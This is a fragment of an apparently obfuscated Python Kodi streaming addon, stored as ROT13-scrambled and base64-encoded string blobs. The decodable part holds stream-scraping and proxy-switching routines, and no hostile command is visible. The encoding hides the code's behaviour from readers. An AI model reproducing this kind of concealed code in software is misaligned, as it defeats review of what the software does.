fp2H6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvNaoTymqUWypTIuqPptnJ4toGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOfnKA0pzIjMJS0CJ1oW2kcp3ElMKOyLKDaKD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUWyqQ1lMF5znJ5xLJkfXT1oW2I4pUWyplqqYTkcozfcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpzI0qKWhVTkcp3ElMKOyLKDfpzI0YPOgYUWyM2I4pj0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUMuoQ0aWj0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJLtoz90VTkcozf9CFpaBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPAjpzyhqPNaoTyhnlpfoTyhnj0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUWyMlN9VUWyYzAioKOcoTHboIfaMKujpzImW10cYaAyLKWwnPufnJ5eXFNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO0pax6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUMuoQ1lMJphM3WiqKNbZFxhp3ElnKNbXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTI4L2IjqQbtqUWuL2IvLJAeYaOlnJ50K2I4LltcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJLtoIfapTSaMFqqCG0aWmbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqzSfCJ1oW2I4pUWyplqqQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvOlLKqDo3A0Bt0XVlNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPNapzS3pT9mqPpAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO2LJj9qKWfoTyvYaS1o3EyK3OfqKZbqzSfXD0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'
god = 'AgICAgcmV0dXJuIHByb3h5VVJMICsgJzonICsgc3RyKHByb3h5UG9ydCkrJzonK3N0cihwcm94eVR5cGUpDQogICAgZWxzZToNCiAgICAgICAgcmV0dXJuIE5vbmUNCiAgICAgICAgDQoNCmRlZiBwbGF5bWVkaWF3aXRocHJveHkobWVkaWFfdXJsLCBuYW1lLCBpY29uSW1hZ2UscHJveHlpcCxwb3J0LCBwcm94eXVzZXI9Tm9uZSwgcHJveHlwYXNzPU5vbmUpOiAjamFpcm94DQoNCiAgICBwcm9ncmVzcyA9IHhibWNndWkuRGlhbG9nUHJvZ3Jlc3MoKQ0KICAgIHByb2dyZXNzLmNyZWF0ZSgnUHJvZ3Jlc3MnLCAnUGxheWluZyB3aXRoIGN1c3RvbSBwcm94eScpDQogICAgcHJvZ3Jlc3MudXBkYXRlKCAxMCwgIiIsICJzZXR0aW5nIHByb3h5Li4iLCAiIiApDQogICAgcHJveHlzZXQ9RmFsc2UNCiAgICBleGlzdGluZ19wcm94eT0nJw0KICAgICNwcmludCAncGxheW1lZGlhd2l0aHByb3h5Jw0KICAgIHRyeToNCiAgICAgICAgDQogICAgICAgIGV4aXN0aW5nX3Byb3h5PWdldENvbmZpZ3VyZWRQcm94eSgpDQogICAgICAgIHByaW50ICdleGlzdGluZ19wcm94eScsZXhpc3RpbmdfcHJveHkNCiAgICAgICAgI3JlYWQgYW5kIHNldCBoZXJlDQogICAgICAgICNqYWlyb3gNCiAgICAgICAgaWYgbm90IHByb3h5dXNlciA9PSBOb25lOg0KICAgICAgICAgICAgc2V0S29kaVByb3h5KCBwcm94eWlwICsgJzonICsgcG9ydCArICc6MDonICsgcHJveHl1c2VyICsgJ0AnICsgcHJveHlwYXNzKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgc2V0S29kaVByb3h5KCBwcm94eWlwICsgJzonICsgcG9ydCArICc6MCcpDQoNCiAgICAgICAgI3ByaW50ICdwcm94eSBzZXR0aW5nIGNvbXBsZXRlJywgZ2V0Q29uZmlndXJlZFByb3h5KCkNCiAgICAgICAgcHJveHlzZXQ9VHJ1ZQ0KICAgICAgICBwcm9ncmVzcy51cGRhdGUoIDgwLCAiIiwgInNldHRpbmcgcHJveHkgY29tcGxldGUsIG5vdyBwbGF5aW5nIiwgIiIgKQ0KICAgICAgICANCiAgICAgICAgcHJvZ3Jlc3MuY2xvc2UoKQ0KICAgICAgICBwcm9ncmVzcz1Ob25lDQogICAgICAgIGltcG9ydCAgQ3VzdG9tUGxheWVyDQogICAgICAgIHBsYXllciA9IEN1c3RvbVBsYXllci5NeVhCTUNQbGF5ZXIoKQ0KICAgICAgICBsaXN0aXRlbSA9IHhibWNndWkuTGlzdEl0ZW0oIGxhYmVsID0gc3RyKG5hbWUpLCBpY29uSW1hZ2UgPSBpY29uSW1hZ2UsIHRodW1ibmFpbEltYWdlID0geGJtYy5nZXRJbmZvSW1hZ2UoICJMaXN0SXRlbS5UaHVtYiIgKSwgcGF0aD1tZWRpYV91cmwgKQ0KICAgICAgICBwbGF5ZXIucGxheSggbWVkaWFfdXJsLGxpc3RpdGVtKQ0KICAgICAgICB4Ym1jLnNsZWVwKDEwMDApDQogICAgICAgIHdoaWxlIHBsYXllci5pc19hY3RpdmU6DQogICAgICAgICAgICB4Ym1jLnNsZWVwKDIwMCkNCiAgICBleGNlcHQ6DQogICAgICAgIHRyYWNlYmFjay5wcmludF9leGMoKQ0KICAgIGlmIHByb2dyZXNzOg0KICAgICAgICBwcm9ncmVzcy5jbG9zZSgpDQogICAgaWYgcHJveHlzZXQ6DQojICAgICAgICBwcmludCAnbm93IHJlc2V0dGluZyB0aGUgcHJveHkgYmFjaycNCiAgICAgICAgc2V0S29kaVByb3h5KGV4aXN0aW5nX3Byb3h5KQ0KIyAgICAgICAgcHJpbnQgJ3Jlc2V0IGhlcmUnDQogICAgcmV0dXJuICcnDQoNCg0KZGVmIGdldF9zYXdfcnRtcChwYWdlX3ZhbHVlLCByZWZlcmVyPU5vbmUpOg0KICAgIGlmIHJlZmVyZXI6DQogICAgICAgIHJlZmVyZXI9WygnUmVmZXJlcicscmVmZXJlcildDQogICAgaWYgcGFnZV92YWx1ZS5zdGFydHN3aXRoKCJodHRwIik6DQogICAgICAgIHBhZ2VfdXJsPXBhZ2VfdmFsdWUNCiAgICAgICAgcGFnZV92YWx1ZT0gZ2V0VXJsKHBhZ2VfdmFsdWUsaGVhZGVycz1yZWZlcmVyKQ0KDQogICAgc3RyX3BhdHRlcm49IihldmFsXChmdW5jdGlvblwocCxhLGMsayxlLCg/OnJ8ZCkuKikiDQoNCiAgICByZWdfcmVzPXJlLmNvbXBpbGUoc3RyX3BhdHRlcm4pLmZpbmRhbGwocGFnZV92YWx1ZSkNCiAgICByPSIiDQogICAgaWYgcmVnX3JlcyBhbmQgbGVuKHJlZ19yZXMpPjA6DQogICAgICAgIGZvciB2IGluIHJlZ19yZXM6DQogICAgICAgICAgICByMT1nZXRfdW5wYWNrZWQodikNCiAgICAgICAgICAgIHIyPXJlX21lKHIxLCdcJyguKj8pXCcnKQ0KICAgICAgICAgICAgaWYgJ3VuZXNjYXBlJyBpbiByMToNCiAgICAgICAgICAgICAgICByMT11cmxsaWIudW5xdW90ZShyMikNCiAgICAgICAgICAgIHIrPXIxKydcbicNCiMgICAgICAgIHByaW50ICdmaW5hbCB2YWx1ZSBpcyAnLHINCg0KICAgICAgICBwYWdlX3VybD1yZV9tZShyLCdzcmM9IiguKj8pIicpDQoNCiAgICAgICAgcGFnZV92YWx1ZT0gZ2V0VXJsKHBhZ2VfdXJsLGhlYWRlcnM9cmVmZXJlcikNCg0KICAgICNwcmludCBwYWdlX3ZhbHVlDQoNCiAgICBydG1wPXJlX21lKHBhZ2VfdmFsdWUsJ3N0cmVhbWVyXCcuKj9cJyguKj8pXCdcKScpDQogICAgcGxheXBhdGg9cmVfbWUocGFnZV92YWx1ZSwnZmlsZVwnLFxzXCcoLio/KVwnJykNCg0KDQogICAgcmV0dXJuIHJ0bXArJyBwbGF5cGF0aD0nK3BsYXlwYXRoICsnIHBhZ2VVcmw9JytwYWdlX3VybA0KDQoNCmRlZiBnZXRfbGV0b25fcnRtcChwYWdlX3ZhbHVlLCByZWZlcmVyPU5vbmUpOg0KICAgIGlmIHJlZmVyZXI6DQogICAgICAgIHJlZmVyZXI9WygnUmVmZXJlcicscmVmZXJlcildDQogICAgaWYgcGFnZV92YWx1ZS5zdGFydHN3aXRoKCJodHRwIik6DQogICAgICAgIHBhZ2VfdmFsdWU9IGdldFVybChwYWdlX3ZhbHVlLGhlYWRlcnM9cmVmZXJlcikNCiAgICBzdHJfcGF0dGVybj0idmFyIGEgPSAoLio/KTtccyp2YXIgYiA9ICguKj8pO1xzKnZhciBjID0gKC4qPyk7XHMqdmFyIGQgPSAoLio/KTtccyp2YXIgZiA9ICguKj8pO1xzKnZhciB2X3BhcnQgPSAnKC4qPyknOyINCiAgICByZWdfcmVzPXJlLmNvbXBpbGUoc3RyX3BhdHRlcm4pLmZpbmRhbGwocGFnZV92YWx1ZSlbMF0NCg0KICAgIGEsYixjLGQsZix2PShyZWdfcmVzKQ0KICAgIGY9aW50KGYpDQogICAgYT1pbnQoYSkvZg0KICAgIGI9aW50KGIpL2YNCiAgICBjPWludChjKS9mDQogICAgZD1pbnQoZCkvZg0KDQogICAgcmV0PSAncnRtcDovLycgKyBzdHIoYSkgKyAnLicgKyBzdHIoYikgKyAnLicgKyBzdHIoYykgKyAnLicgKyBzdHIoZCkgKyB2Ow0KICAgIHJldHVybiByZXQNCg0KDQpkZWYgY3JlYXRlTTN1Rm9yRGFzaCh1cmwsdXNlcmFnZW50PU5vbmUpOg0KICAgIHN0cj0nI0VYVE0zVScNCiAgICBzdHIrPSdcbiNFWFQtWC1TVFJFQU0tSU5GOlBST0dSQU0tSUQ9MSxCQU5EV0lEVEg9MzYxODE2Jw0KICAgIHN0cis9J1xuJyt1cmwrJyZieXRlcz0wLTIwMDAwMCcjKyd8VXNlci1BZ2VudD0nK3VzZXJhZ2VudA0KICAgIHNvdXJjZV9maWxlID0gb3MucGF0aC5qb2luKHByb2ZpbGUsICd0ZXN0ZmlsZS5tM3UnKQ0KICAgIHN0cis9J1xuJw0KICAgIFNhdmVUb0ZpbGUoc291cmNlX2ZpbGUsc3RyKQ0KICAgICNyZXR1cm4gJ0M6L1VzZXJzL3NoYW5pL0Rvd25sb2Fkcy90ZXN0Lm0zdTgnDQogICAgcmV0dXJuIHNvdXJjZV9maWxlDQoNCg0KZGVmIFNhdmVUb0ZpbGUoZmlsZV9uYW1lLHBhZ2VfZGF0YSxhcHBlbmQ9RmFsc2UpOg0KICAgIGlmIGFwcGVuZDoNCiAgICAgICAgZiA9IG9wZW4oZmlsZV9uYW1lLCAnYScpDQogICAgICAgIGYud3JpdGUocGFnZV9kYXRhKQ0KICAgICAgICBmLmNsb3NlKCkNCiAgICBlbHNlOg0KICAgICAgICBmPW9wZW4oZmlsZV9uYW1lLCd3YicpDQogICAgICAgIGYud3JpdGUocGFnZV9kYXRhKQ0KICAgICAgICBmLmNsb3NlKCkNCiAgICAgICAgcmV0dXJuICcnDQoNCg0KZGVmIExvYWRGaWxlKGZpbGVfbmFtZSk6DQogICAgZj1vcGVuKGZpbGVfbmFtZSwncmInKQ0KICAgIGQ9Zi5yZWFkKCkNCiAgICBmLmNsb3NlKCkNCiAgICByZXR1cm4gZA0KDQoNCmRlZiBnZXRfcGFja2VkX2lwaG9uZXR2X3VybChwYWdlX2RhdGEpOg0KICAgIGltcG9ydCByZSxiYXNlNjQsdXJsbGliOw0KICAgIHM9cGFnZV9kYXRhDQogICAgd2hpbGUgJ2dlaCgnIGluIHM6DQogICAgICAgIGlmIHMuc3RhcnRzd2l0aCgnbG9sKCcpOiBzPXNbNTotMV0NCiMgICAgICAgcHJpbnQgJ3MgaXMgJyxzDQogICAgICAgIHM9cmUuY29tcGlsZSgnIiguKj8pIicpLmZpbmRhbGwocylbMF07DQogICAgICAgIHM9ICBiYXNlNjQuYjY0ZGVjb2RlKHMpOw0KICAgICAgICBzPXVybGxpYi51bnF1b3RlKHMpOw0KICAgIHByaW50IHMNCiAgICByZXR1cm4gcw0KDQoNCmRlZiBnZXRfZmVycmFyaV91cmwocGFnZV9kYXRhKToNCiMgICAgcHJpbnQgJ2dldF9kYWdfdXJsMicscGFnZV9kYXRhDQogICAgcGFnZV9kYXRhMj1nZXRVcmwocGFnZV9kYXRhKTsNCiAgICBwYXR0PScoaHR0cC4qKScNCiAgICBpbXBvcnQgdXVpZA0KICAgIHBsYXliYWNrPXN0cih1dWlkLnV1aWQxKCkpLnVwcGVyKCkNCiAgICBsaW5rcz1yZS5jb21waWxlKHBhdHQpLmZpbmRhbGwocGFnZV9kYXRhMikNCiAgICBoZWFkZXJzPVsoJ1gtUGxheWJhY2stU2Vzc2lvbi1JZCcscGxheWJhY2spXQ0KICAgIGZvciBsIGluIGxpbmtzOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcGFnZV9kYXRhdGVtcD1nZXRVcmwobCxoZWFkZXJzPWhlYWRlcnMpOw0KDQogICAgICAgIGV4Y2VwdDogcGFzcw0KDQogICAgcmV0dXJuIHBhZ2VfZGF0YSsnfCZYLVBsYXliYWNrLVNlc3Npb24tSWQ9JytwbGF5YmFjaw0KDQoNCmRlZiBnZXRfZGFnX3VybChwYWdlX2RhdGEpOg0KIyAgICBwcmludCAnZ2V0X2RhZ191cmwnLHBhZ2VfZGF0YQ0KICAgIGlmIHBhZ2VfZGF0YS5zdGFydHN3aXRoKCdodHRwOi8vZGFnLnRvdGFsLXN0cmVhbS5uZXQnKToNCiAgICAgICAgaGVhZGVycz1bKCdVc2VyLUFnZW50JywnVmVyaXNtby1CbGFja1VJXygyLjQuNy41LjguMC4zNCknKV0NCiAgICAgICAgcGFnZV9kYXRhPWdldFVybChwYWdlX2RhdGEsaGVhZGVycz1oZWFkZXJzKTsNCg0KICAgIGlmICcxMjcuMC4wLjEnIGluIHBhZ2VfZGF0YToNCiAgICAgICAgcmV0dXJuIHJldmlzdF9kYWcocGFnZV9kYXRhKQ0KICAgIGVsaWYgcmVfbWUocGFnZV9kYXRhLCAnd21zQXV0aFNpZ24lM0QoW14lJl0rKScpICE9ICcnOg0KICAgICAgICBmaW5hbF91cmwgPSByZV9tZShwYWdlX2RhdGEsICcmdmVyX3Q9KFteJl0rKSYnKSArICc/d21zQXV0aFNpZ249JyArIHJlX21lKHBhZ2VfZGF0YSwgJ3dtc0F1dGhTaWduJTNEKFteJSZdKyknKSArICc9PS9tcDQ6JyArIHJlX21lKHBhZ2VfZGF0YSwgJ1xcP3k9KFteJl0rKSYnKQ0KICAgIGVsc2U6DQogICAgICAgIGZpbmFsX3VybCA9IHJlX21lKHBhZ2VfZGF0YSwgJ2hyZWY9IihbXiJdKykiW14iXSskJykNCiAgICAgICAgaWYgbGVuKGZpbmFsX3VybCk9PTA6DQogICAgICAgICAgICBmaW5hbF91cmw9cGFnZV9kYXRhDQogICAgZmluYWxfdXJsID0g